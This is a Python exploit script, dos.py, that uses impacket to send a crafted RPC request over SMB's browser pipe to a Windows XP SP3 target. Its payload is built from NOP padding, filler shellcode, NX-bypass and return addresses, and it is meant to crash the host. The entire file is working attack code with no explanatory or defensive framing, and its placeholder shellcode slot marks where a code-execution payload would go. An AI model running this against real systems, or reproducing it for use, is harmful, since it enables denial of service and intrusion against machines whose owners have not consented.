# dos.py
import struct
import time
import sys

try:
    from impacket import smb
    from impacket import uuid
    from impacket.dcerpc.v5 import transport
except ImportError as _:
    print('Please install impacket. System is terminated.')
    sys.exit(1)
    
shellcode = b'\x41' * 410

num_nops = 410 - len(shellcode)
newshellcode = b"\x90" * num_nops
newshellcode += shellcode
shellcode = newshellcode

nonxjmper = b"\x08\x04\x02\x00" + b"%s" + b"A" * 4 + b"%s" + b"A" * 42 + b"\x90" * 8 + b"\xeb\x62" + b"A" * 10

def main():
    try:
        target = sys.argv[1]
        port = int(sys.argv[2])
    except IndexError:
        print('\nUsage: %s <target ip> <Port #>\n' % sys.argv[0])
        print('Example: python3 dos.py 192.168.1.1 445')
        sys.exit(-1)

    print('Windows XP SP3 English (NX)\n')
    ret = b"\x07\xf8\x88\x6f"
    disable_nx = b"\xc2\x17\x89\x6f"
    jumper = nonxjmper % (disable_nx, ret)

    print('[-]Initiating connection')

    if port == 445:
        trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
    else:
        trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % target, dstport=port, filename='\\browser')
    
    trans.connect()
    
    print('[-]connected to ncacn_np:%s[\\pipe\\browser]' % target)
    dce = trans.DCERPC_class(trans)
    dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
    
    path = (
        '\\'.encode('utf-16le') + 
        b"ABCDEFGHIJ" * 10 + 
        shellcode + 
        '\\..\\..\\'.encode('utf-16le') + 
        'ABCDEFG'.encode('utf-16le') + 
        jumper + 
        b"\x00" * 2
    )
    
    server = b"\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
    prefix = b"\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
    
    MaxCount = b"\x36\x01\x00\x00"
    Offset = b"\x00\x00\x00\x00"
    ActualCount = b"\x36\x01\x00\x00"

    stub = server + MaxCount + Offset + ActualCount + \
        path + b"\xE8\x03\x00\x00" + prefix + b"\x01\x10\x00\x00\x00\x00\x00\x00"

    dce.call(0x1f, stub)
    time.sleep(3)
    print('Exploit / Crash finish\n')

if __name__ == '__main__':
    main()